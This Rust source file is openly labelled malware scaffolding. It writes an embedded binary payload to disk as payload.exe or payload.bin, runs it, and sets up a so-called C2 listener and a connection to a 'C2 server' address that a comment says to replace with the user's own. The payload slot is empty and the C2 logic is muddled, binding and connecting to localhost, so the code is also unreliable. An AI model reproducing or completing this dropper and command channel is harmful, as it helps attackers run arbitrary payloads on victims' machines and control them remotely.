use std::process::Command;
use std::thread;
use std::time::Duration;
use std::io::{self, Write};
use std::net::{TcpStream, TcpListener};
use std::sync::mpsc::{self, Receiver, Sender};

const ASSEMBLY_PAYLOAD: &[u8] = &[
    // Your assembly payload in binary format goes here
];

fn execute_payload() -> io::Result<()> {
    // Create a temporary file to write the payload
    let payload_path = if cfg!(target_os = "windows") {
        "payload.exe"
    } else {
        "payload.bin"
    };

    let mut file = std::fs::File::create(payload_path)?;
    file.write_all(ASSEMBLY_PAYLOAD)?;

    // Execute the payload
    Command::new(payload_path)
        .spawn()?
        .wait()?;
    
    Ok(())
}

fn c2_listener(rx: Receiver<String>) {
    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();

    for stream in listener.incoming() {
        match stream {
            Ok(mut stream) => {
                let command = rx.recv().unwrap();
                stream.write_all(command.as_bytes()).unwrap();
            }
            Err(e) => eprintln!("Error: {}", e),
        }
    }
}

fn connect_to_c2(server_address: &str, tx: Sender<String>) {
    let mut stream = TcpStream::connect(server_address).unwrap();

    loop {
        let mut buffer = String::new();
        io::stdin().read_line(&mut buffer).unwrap();
        
        tx.send(buffer.clone()).unwrap();
        stream.write_all(buffer.as_bytes()).unwrap();

        // Sleep to prevent spamming
        thread::sleep(Duration::from_secs(1));
    }
}

fn main() {
    // Setup channel for communication
    let (tx, rx) = mpsc::channel();

    // Start C2 listener in a new thread
    thread::spawn(move || c2_listener(rx));

    // Connect to C2 server
    let c2_address = "127.0.0.1:8080"; // Replace with your C2 server address
    thread::spawn(move || connect_to_c2(c2_address, tx));

    // Execute the payload
    if let Err(e) = execute_payload() {
        eprintln!("Failed to execute payload: {}", e);
    }

    // Keep the main thread alive
    loop {
        thread::sleep(Duration::from_secs(60));
    }
}

